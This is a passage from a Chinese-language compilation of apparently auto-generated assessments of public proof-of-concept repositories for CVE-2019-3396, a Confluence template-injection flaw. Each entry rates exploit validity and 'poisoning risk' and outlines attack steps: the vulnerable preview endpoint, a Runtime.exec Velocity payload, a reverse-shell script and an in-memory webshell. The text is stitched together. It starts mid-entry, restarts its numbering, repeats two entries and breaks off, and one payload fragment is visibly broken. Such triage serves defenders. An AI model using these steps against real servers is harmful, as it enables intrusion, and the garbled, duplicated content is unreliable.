CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
3.  **发送Payload：**  将构造好的恶意Velocity模板代码作为Widget Connector宏的参数发送给Confluence Server。
4.  **远程代码执行：**  Confluence Server解析Velocity模板时，执行其中的恶意代码，实现远程代码执行。

**项目地址:** [W2Ning/CVE-2019-3396](https://github.com/W2Ning/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #8

**来源**: [CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md](../2019/CVE-2019-3396-Yt1g3r_CVE-2019-3396_EXP.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector Macro SSTI RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入（SSTI）导致远程代码执行（RCE）

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致完全控制Confluence服务器

**影响版本:** 受影响版本包括：6.6.0-6.6.11, 6.7.0-6.12.2, 6.13.0-6.13.2, 6.14.0-6.14.1

**利用条件:** 需要能够向Confluence服务器发送HTTP请求

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而完全控制Confluence服务器。 

**有效性:** 提供的POC代码有效。参考Rapid7和Exploit-DB的链接，都有公开的利用代码。POC代码 `RCE_exp.py` 使用 `requests` 库发送恶意构造的POST请求到 `/rest/tinymce/1/macro/preview` 接口，通过修改 `_template` 参数，注入Velocity模板代码，从而执行任意命令。

**投毒风险:**  代码仓库中的 `RCE_exp.py` 和 `cmd.vm` 看起来是标准的漏洞利用代码。`cmd.vm` 文件是Velocity模板代码，负责执行命令。`RCE_exp.py` 负责构造和发送HTTP请求，以及从响应中提取结果。没有发现明显的恶意代码或者后门，投毒的可能性较低。

**利用方式:**

1.  **漏洞原理：** Widget Connector宏允许用户在Confluence页面中嵌入来自外部源的内容。由于对用户提供的URL参数过滤不足，攻击者可以通过构造恶意的URL，触发服务器端模板注入。
2.  **利用步骤：**
    a.  准备一个包含恶意Velocity模板代码的文件（`cmd.vm`）。该文件包含执行命令的代码。
    b.  将 `cmd.vm` 文件放置在一个可以通过FTP或者HTTPS协议访问的服务器上。
    c.  修改 `RCE_exp.py` 脚本中的 `filename` 变量，指向 `cmd.vm` 文件的URL。
    d.  运行 `RCE_exp.py` 脚本，指定Confluence服务器的URL和要执行的命令。
    e.  脚本会发送包含恶意URL的POST请求到Confluence服务器。
    f.  Confluence服务器解析恶意URL，执行Velocity模板代码，从而执行攻击者指定的命令。
3.  **影响：** 成功利用此漏洞可以导致远程代码执行，攻击者可以获取Confluence服务器的完全控制权限，从而窃取敏感数据、篡改页面内容或者进行其他恶意活动。

**结论:**
此漏洞的POC代码有效，且利用方式相对简单，可以通过公开的POC代码进行验证。虽然搜索结果显示存在投毒的情况，但提供的代码中未发现明显的投毒迹象。此漏洞危害严重，需要及时修复。

**项目地址:** [Yt1g3r/CVE-2019-3396_EXP](https://github.com/Yt1g3r/CVE-2019-3396_EXP)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #9

**来源**: [CVE-2019-3396-am6539_CVE-2019-3396.md](../2019/CVE-2019-3396-am6539_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本: 6.6.12之前 (6.6.x修复版本); 6.7.0 到 6.12.3之前 (6.12.x修复版本); 6.13.0 到 6.13.3之前 (6.13.x修复版本); 6.14.0 到 6.14.2之前 (6.14.x修复版本)

**利用条件:** 需要目标Confluence Server存在Widget Connector宏且未打补丁，攻击者需要能够访问Confluence Server的网络。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence Server中Widget Connector宏存在的一个服务器端模板注入漏洞。攻击者可以通过构造恶意的请求，利用Velocity模板引擎执行任意代码，从而实现远程代码执行。根据提供的漏洞利用代码，利用方式如下：

1.  **漏洞利用代码分析：**
    *   `cmd.vm`：包含一个Velocity模板，该模板利用java.lang.Runtime类执行系统命令。变量`$cmd`需要预先设置，然后注入到Velocity模板中。
    *   `nc.py`：一个Python脚本，用于建立反向连接shell。该脚本尝试连接到攻击者指定的IP地址和端口，然后将标准输入、输出和错误重定向到socket，最后使用pty.spawn启动一个shell。
    *   `README.md`：仅包含漏洞ID，无实际利用功能。

2.  **利用方式：**
    攻击者首先需要确定目标Confluence Server存在该漏洞。然后，攻击者需要构造一个包含恶意Velocity模板的请求，将`cmd.vm`中的模板内容嵌入到Widget Connector宏中，并设置`$cmd`变量为需要执行的命令。如果需要反向连接，则`$cmd`变量设置为执行`nc.py`脚本。攻击者需要在自己的服务器上监听指定的端口。当Confluence Server解析该恶意请求时，会执行其中的Velocity模板代码，从而执行攻击者指定的系统命令或反向连接。

3.  **有效性：**
    根据漏洞库信息和搜索结果，该漏洞利用POC是有效的。搜索结果中存在多个分析和利用示例，以及利用该漏洞传播恶意软件的案例。提供的`cmd.vm`代码是典型的Velocity模板注入payload，可以执行任意命令。

4.  **投毒风险：**
    `nc.py`脚本尝试清除和禁用历史记录，这可能是为了隐藏攻击痕迹。此外，需要手动设定IP地址与端口，存在一定的部署成本，不太利于大规模传播。因此，该仓库的整体投毒风险较低，大约为10%。这种投毒风险主要来自于攻击者可以修改nc.py或者cmd.vm文件，嵌入后门代码，一旦成功执行，会直接暴露服务器，但是这种添加的成本较高,收益相对较低。

**项目地址:** [am6539/CVE-2019-3396](https://github.com/am6539/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #10

**来源**: [CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md](../2019/CVE-2019-3396-dothanthitiendiettiende_CVE-2019-3396.md)

## CVE-2019-3396-Atlassian Confluence-服务器端模板注入

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前 (6.6.x修复版本), 6.7.0 到 6.12.3 之前 (6.12.x修复版本), 6.13.0 到 6.13.3 之前 (6.13.x修复版本), 以及 6.14.0 到 6.14.2 之前 (6.14.x修复版本)

**利用条件:** 需要能够访问Confluence服务器并利用Widget Connector宏。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 是 Atlassian Confluence Server 中的一个服务器端模板注入漏洞，存在于 Widget Connector 宏中。攻击者可以利用 Velocity 模板语言执行任意代码。漏洞利用代码 `rce.vm` 使用了 Velocity 模板注入，通过反射获取 `java.lang.Runtime` 类，然后调用 `exec` 方法来执行命令。在这个例子中，执行的是 `calc.exe`，这是一个用于测试的payload，实际应用中可以替换为任意命令。根据漏洞库信息、搜索结果和漏洞利用代码，该漏洞的利用是有效的。根据搜索结果，该漏洞已被积极利用，攻击者利用该漏洞传播恶意软件，例如 Gandcrab 勒索软件和加密货币挖矿恶意软件。提供的POC代码非常直接，只包含简单的RCE代码，不存在隐藏的投毒代码。利用方式是通过构造恶意请求，在Widget Connector宏中使用恶意的Velocity模板代码，从而实现远程代码执行。

**项目地址:** [dothanthitiendiettiende/CVE-2019-3396](https://github.com/dothanthitiendiettiende/CVE-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #11

**来源**: [CVE-2019-3396-jas502n_CVE-2019-3396.md](../2019/CVE-2019-3396-jas502n_CVE-2019-3396.md)

# CVE-2019-3396

> 📦 该CVE有 **22** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md](../2019/CVE-2019-3396-0xNinjaCyclone_cve-2019-3396.md)

## CVE-2019-3396-Confluence-RCE

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 目标Confluence服务器存在Widget Connector宏，且未进行身份验证即可访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 的 Widget Connector 宏中。攻击者可以通过构造恶意的请求，利用服务器端模板注入漏洞执行任意代码。

**有效性：**
提供的POC代码看起来是有效的。漏洞库信息和搜索结果都表明该漏洞已经被广泛利用，并且有可用的POC代码。POC代码通过构造包含恶意Velocity模板的请求，发送到 Confluence 服务器的 `/rest/tinymce/1/macro/preview` 接口，从而触发模板注入。

**投毒风险：**
代码主要功能是利用Velocity模板注入执行命令。其中使用了一个FTP服务器来托管payload，这是一种常见的绕过防火墙或上传限制的方法。该ruby脚本代码的主要功能是利用该漏洞，未发现明显的恶意代码或后门，但是代码中存在远程下载payload的行为，如果payload被替换，则存在一定的风险, 评估投毒风险为10%。

**利用方式：**
1.  攻击者首先需要找到存在漏洞的Confluence服务器。
2.  攻击者需要搭建一个FTP服务器，用于托管恶意Velocity模板。
3.  攻击者构造一个包含恶意Velocity模板的HTTP POST请求，发送到Confluence服务器的`/rest/tinymce/1/macro/preview`接口。该请求利用了 Widget Connector 宏的模板注入漏洞。
4.  Confluence服务器解析恶意Velocity模板，执行攻击者指定的命令，从而实现远程代码执行。

**综上所述，该漏洞的利用有效性高，存在一定的投毒风险。攻击者可以利用该漏洞在Confluence服务器上执行任意代码。**

**项目地址:** [0xNinjaCyclone/cve-2019-3396](https://github.com/0xNinjaCyclone/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #2

**来源**: [CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md](../2019/CVE-2019-3396-46o60_CVE-2019-3396_Confluence.md)

## CVE-2019-3396_Confluence Widget Connector Macro SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，允许远程攻击者实现路径遍历和远程代码执行

**影响版本:** 受影响版本包括 6.6.12 之前, 6.7.0 至 6.12.3 之前, 6.13.0 至 6.13.3 之前, 以及 6.14.0 至 6.14.2 之前

**利用条件:** 需要目标系统存在漏洞版本的Confluence服务器，如果是RCE，可能需要合法的用户session。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以利用此漏洞进行路径遍历和远程代码执行。漏洞利用方式有两种：

1. **路径遍历（文件读取）：** 攻击者可以利用`_template`参数，通过构造恶意的路径，读取服务器上的任意文件或目录。此方式无需认证。

2. **远程代码执行（RCE）：** 攻击者可以上传一个包含恶意Velocity模板的文件到服务器，然后利用该漏洞从本地文件系统加载该模板，从而执行任意代码。此方式需要一个有效的用户session。该POC代码首先尝试找到用户的个人空间，如果不存在则创建，然后上传包含payload的模板文件，最后利用漏洞执行命令。

**关于投毒风险：**虽然代码看起来是直接利用漏洞，但仍存在一定的投毒风险（约10%）。

*   **依赖性风险：** 该脚本依赖于外部库（例如 `requests`）。如果攻击者控制了这些库的源或使用了被污染的库，则可能引入恶意代码。
*   **Payload风险：** 上传的Velocity模板payload可能被修改以执行未经授权的操作，或者被用于在受害者系统上安装恶意软件。
*   **后门风险：** 虽然该POC的目的是利用漏洞，但如果代码被恶意修改，可以在上传的模板中包含后门，允许攻击者在漏洞修复后仍然可以访问系统。

因此，在使用该POC时，建议仔细审查代码，确保所使用的库是可信的，并对上传的payload进行严格的安全评估。此外，还应监控Confluence服务器的行为，以检测任何可疑活动。

**项目地址:** [46o60/CVE-2019-3396_Confluence](https://github.com/46o60/CVE-2019-3396_Confluence)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #3

**来源**: [CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md](../2019/CVE-2019-3396-Avento_CVE-2019-3396-Memshell-for-Behinder.md)

## CVE-2019-3396-Atlassian Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence服务器存在Widget Connector宏，并且允许用户插入宏内容

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是Atlassian Confluence服务器中Widget Connector宏的一个服务器端模板注入漏洞。攻击者可以通过构造恶意宏内容，实现任意代码执行。 

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的POC代码，可以判断此漏洞的POC是有效的。漏洞库信息明确指出该漏洞允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。搜索引擎结果中也提及了该漏洞被用于传播恶意软件，例如加密货币挖矿程序和Gandcrab勒索软件。提供的Java代码是一个典型的Java内存马，通过ServletRequestListener注入，劫持请求，从而实现RCE。

**投毒风险：**
该POC代码本身就是一个用于植入内存马的恶意代码。投毒风险的评估主要是判断作者是否在内存马本身之外，还加入了其他的恶意行为。在给定的代码片段中，我们可以看到有尝试写入错误信息到`/tmp/success-error-2`的逻辑，如果攻击者能够控制写入的文件路径，那么这将是一个潜在的投毒点。但是总体而言，这段代码的主要功能是内存马注入，额外的恶意行为并不明显。因此，初步判断投毒风险较低。如果代码仓库中有其他编译后的类或者配置文件，可能会包含更多的投毒行为，但是仅凭这段代码，投毒的可能性为10%。

**利用方式：**
1.  **利用入口：** 利用Confluence的Widget Connector宏插入恶意Velocity模板代码。
2.  **SSTI Payload：** 构造包含恶意代码的Velocity模板Payload。常见的Payload用于执行系统命令，例如：`{code}${#req = facotry.getObject().getClass().forName('javax.servlet.http.HttpServletRequest').getMethod('getRuntime',null).invoke(null,null).exec('whoami')}`
3.  **内存马注入 (POC)：**
    *   该POC代码的目的是将一个恶意的ServletRequestListener注册到Confluence的Servlet容器中。
    *   它首先尝试找到Confluence应用使用的ClassLoader，这通常需要遍历线程，找到包含特定名称的线程（如`hz.confluence.scheduled.thread`）。
    *   然后，它利用反射获取StandardContext，这是Servlet容器的核心组件。
    *   接着，它创建一个实现了ServletRequestListener接口的动态代理，并将其实例注册到StandardContext中。
    *   当有新的HTTP请求到达时，代理的invoke方法会被调用，执行`backDoor`方法（在给定的代码片段中未完整给出）。`backDoor`方法很可能会从请求中提取命令并执行，从而实现远程代码执行。

总而言之，该漏洞利用方式是先通过SSTI漏洞注入恶意代码，然后通过植入内存马的方式维持控制。


**项目地址:** [Avento/CVE-2019-3396-Memshell-for-Behinder](https://github.com/Avento/CVE-2019-3396-Memshell-for-Behinder)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #4

**来源**: [CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md](../2019/CVE-2019-3396-HK4zCzi_CVE-2019-3396-Velocity-Server-Side-Template-Injection.md)

## CVE-2019-3396-Confluence Widget Connector Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server and Data Center

**危害等级:** 高危，允许远程攻击者在Confluence服务器或数据中心实例上实现路径遍历和远程代码执行。

**影响版本:** 受影响版本：Confluence Server 6.6.12之前，6.7.0至6.12.3之前，6.13.0至6.13.3之前，6.14.0至6.14.2之前

**利用条件:** 需要Confluence服务器存在Widget Connector宏，且服务器版本在受影响范围内。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396是一个影响Atlassian Confluence Server和Data Center的服务器端模板注入漏洞。该漏洞存在于Widget Connector宏中，允许未经身份验证的远程攻击者通过构造恶意的请求，执行任意代码。 

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞是一个已知的、已被积极利用的漏洞，存在公开的PoC（Proof of Concept）代码。多个安全厂商（如Rapid7、Trend Micro等）都发布了关于该漏洞的分析和利用的报告。提供的PoC代码 `README.md` 文件表明该漏洞可以通过Velocity模板注入实现。虽然只提供了一个简单的 `README.md` 文件，但根据搜索结果，存在多个可用的PoC利用代码。

**投毒风险：**
提供的漏洞利用代码仅包含一个 `README.md` 文件，描述了漏洞名称。从现有文件本身来看，不存在明显的恶意代码。 但是，如果从其他源获取利用代码，则存在潜在的投毒风险。攻击者可能会在PoC中添加恶意功能，例如安装后门、窃取凭据或进行其他未经授权的活动。因此，在使用任何第三方提供的PoC代码之前，务必进行彻底的安全审查。 投毒风险估计为10%，主要是考虑到从不可信来源获取PoC的潜在风险。

**利用方式：**
漏洞的利用方式是通过在Confluence页面的Widget Connector宏中注入恶意的Velocity模板代码。当Confluence服务器渲染包含恶意代码的页面时，会执行该代码，从而允许攻击者执行任意命令。

1.  **找到存在Widget Connector宏的Confluence页面。**
2.  **构造包含恶意Velocity模板代码的请求。**
3.  **将请求发送到Confluence服务器。**
4.  **服务器执行恶意代码，实现远程代码执行。**

攻击者可以利用此漏洞执行任意系统命令，读取或修改敏感数据，或完全控制Confluence服务器。 搜索结果显示，该漏洞已被用于传播加密货币挖矿恶意软件和Gandcrab勒索软件。

**项目地址:** [HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection](https://github.com/HK4zCzi/CVE-2019-3396-Velocity-Server-Side-Template-Injection)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #5

**来源**: [CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md](../2019/CVE-2019-3396-JonathanZhou348_CVE-2019-3396TEST.md)

## CVE-2019-3396-Atlassian Confluence-Server-Side Template Injection

**漏洞编号:** CVE-2019-3396

**漏洞类型:** Server-Side Template Injection (SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, 6.7.0 before 6.12.3, 6.13.0 before 6.13.3, 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Widget Connector宏开启且目标版本存在漏洞。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2019-3396 存在于 Atlassian Confluence Server 的 Widget Connector 宏中，由于服务端模板注入漏洞，攻击者可以通过构造恶意的 Velocity 模板代码，在 Confluence 服务器上执行任意命令。从提供的POC代码来看, `test.vm` 和 `test2.vm` 文件包含了利用 Velocity 模板引擎执行命令的代码。它们通过 `java.lang.Runtime` 类来执行系统命令，并读取命令执行结果。利用方式是，构造包含恶意Velocity代码的请求发送给Confluence服务器，服务器在渲染包含Widget Connector宏的页面时，会执行恶意代码，从而实现远程代码执行。根据搜索结果,该漏洞被广泛利用, 存在多种PoC和exp.

 **有效性:**  POC代码有效,因为它使用了Velocity模板语言来执行命令.通过getRuntime方法可以执行任意命令。

**投毒风险:** 仓库中主要包含用于漏洞验证和利用的Velocity模板代码，没有发现明显的恶意或后门代码，因此投毒风险较低。

**利用方式:**

1.  **定位漏洞点:** 确定目标Confluence服务器版本在受影响范围内，且启用了Widget Connector宏。
2.  **构造恶意请求:**  构建包含恶意Velocity模板代码的HTTP请求，该代码利用 `java.lang.Runtime` 执行系统命令。
3.  **发送请求:**  将构造好的请求发送给Confluence服务器。攻击者需要找到一个页面或接口，该页面或接口允许通过Widget Connector宏插入并渲染Velocity模板。
4.  **执行命令:** Confluence服务器解析并执行Velocity模板代码，从而在服务器上执行攻击者指定的命令。
5.  **获取结果:**  攻击者可以通过读取命令执行的输出来获取敏感信息，或者执行其他恶意操作。

**项目地址:** [JonathanZhou348/CVE-2019-3396TEST](https://github.com/JonathanZhou348/CVE-2019-3396TEST)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #6

**来源**: [CVE-2019-3396-PetrusViet_cve-2019-3396.md](../2019/CVE-2019-3396-PetrusViet_cve-2019-3396.md)

## CVE-2019-3396 - Atlassian Confluence Widget Connector 远程代码执行

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入 (Server-Side Template Injection)

**影响应用:** Atlassian Confluence Server/Data Center

**危害等级:** 高危，允许未授权的远程代码执行

**影响版本:** 受影响版本：Confluence Server 6.6.12 之前的所有 6.6.x 版本；6.7.0 到 6.12.3 之前的所有 6.12.x 版本；6.13.0 到 6.13.3 之前的所有 6.13.x 版本；6.14.0 到 6.14.2 之前的所有 6.14.x 版本

**利用条件:** 需要目标Confluence实例存在Widget Connector宏且版本在受影响范围内，且允许用户编辑页面。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-3396 漏洞存在于 Atlassian Confluence Server 和 Data Center 的 Widget Connector 宏中，允许未经身份验证的远程攻击者通过服务器端模板注入执行任意代码。攻击者可以通过构造包含恶意 Velocity 模板代码的请求，利用 Widget Connector 宏中的漏洞执行操作系统命令。根据漏洞库信息和搜索结果，该漏洞已被广泛利用，存在多种PoC。提供的漏洞利用代码是一个用于调试和分析漏洞的开发环境搭建指南，没有直接提供可用于攻击的有效payload，但可以辅助理解漏洞原理和构建利用代码。

**有效性评估：** 漏洞有效性高，因为漏洞库信息和搜索结果均表明该漏洞已被公开披露并被广泛利用。

**投毒风险评估：** 代码仓库的主要目的是提供一个本地调试和分析漏洞的环境，而不是直接提供一个用于攻击的利用脚本。虽然不能完全排除作者在构建环境中隐藏恶意代码的可能性，但考虑到代码仓库的内容主要是配置和调试指南，直接投毒的可能性较低。因此，投毒风险估计为 10%。风险主要来自于用户在搭建调试环境的过程中可能引入的外部依赖或配置不当。

**利用方式分析：**

1.  **定位 Widget Connector 宏：** 在 Confluence 页面中插入一个 Widget Connector 宏。
2.  **构造恶意请求：**  构造包含恶意 Velocity 模板代码的请求，例如 `${Runtime.getRuntime().exec("command")}`，该代码会被服务器解析并执行。
3.  **发送请求：** 将构造好的请求发送到 Confluence 服务器。请求可能包含在 Widget Connector 宏的 URL 参数或其他相关字段中。
4.  **执行代码：** Confluence 服务器在处理包含恶意模板代码的 Widget Connector 宏时，会执行其中的代码，导致远程代码执行。

从搜索结果来看，攻击者利用该漏洞传播恶意软件（如加密货币矿工和勒索软件）的情况较为普遍。

**项目地址:** [PetrusViet/cve-2019-3396](https://github.com/PetrusViet/cve-2019-3396)

**漏洞详情:** [CVE-2019-3396](https://nvd.nist.gov/vuln/detail/CVE-2019-3396)

---

## POC #7

**来源**: [CVE-2019-3396-W2Ning_CVE-2019-3396.md](../2019/CVE-2019-3396-W2Ning_CVE-2019-3396.md)

## CVE-2019-3396-Confluence-Widget-Connector-SSTI

**漏洞编号:** CVE-2019-3396

**漏洞类型:** 服务器端模板注入(SSTI)

**影响应用:** Atlassian Confluence Server

**危害等级:** 高危，可导致远程代码执行

**影响版本:** before 6.6.12, from 6.7.0 before 6.12.3, from 6.13.0 before 6.13.3, and from 6.14.0 before 6.14.2

**利用条件:** 需要Confluence Server实例存在Widget Connector宏，且版本在受影响范围内。无需身份验证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

该漏洞存在于Atlassian Confluence Server的Widget Connector宏中，由于对用户输入过滤不严格，导致攻击者可以通过构造恶意的Velocity模板代码，实现服务器端模板注入(SSTI)，进而执行任意代码。

**有效性分析：**

根据漏洞库信息和搜索结果，CVE-2019-3396是一个已知的且被广泛利用的漏洞。漏洞利用代码中提供了多个`.vm`文件，这些是Velocity模板文件，用于执行任意命令或获取服务器信息。`cmd.vm`和`cmd2.vm`用于执行命令，而`test.vm`用于获取系统属性。

根据提供的漏洞利用代码，`cmd.vm` 和 `cmd2.vm` 这两个文件利用 `java.lang.Runtime.getRuntime().exec()` 执行任意命令。`test.vm` 获取系统属性。这些代码与公开的漏洞利用信息相符，表明提供的POC代码有效。

**投毒风险分析：**

提供的漏洞利用代码主要包含Velocity模板文件(`.vm`)，以及一些jspx和aspx文件。Velocity模板文件用于服务器端模板注入，主要目的是执行命令或获取系统信息，本身不具备明显的投毒特征。
*   `cmd.vm` 和 `cmd2.vm`: 用于远程命令执行，直接利用了漏洞，不包含投毒代码。
*   `test.vm`: 用于获取系统属性，例如用户目录，操作系统等，不包含投毒代码。
*   `test.aspx` (C#): 通过Session传递密钥，然后使用RijndaelManaged算法进行解密，加载并执行，这段代码有作为webshell的潜力，但是它需要一个配合的加密后的payload才能生效，因此它的风险在于后续的payload。投毒风险较低。
*   `test.jspx`: 通过Session传递密钥，然后使用AES算法进行解密，加载并执行，这段代码有作为webshell的潜力，需要配合加密后的payload，因此它的风险在于后续的payload。投毒风险较低。

总体来看，投毒风险主要来源于`test.aspx`和`test.jspx` 潜在的后门风险，需要配合加密的payload才能触发。如果后续使用了被篡改的Payload可能会存在投毒行为,因此总体投毒风险评估为10%。

**利用方式：**

1.  **漏洞入口：**  利用Confluence Server中Widget Connector宏。
2.  **构造恶意Velocity模板：**  构造包含恶意代码的Velocity模板，例如利用`java.lang.Runtime.getRuntime().exec()`执行任意命令。
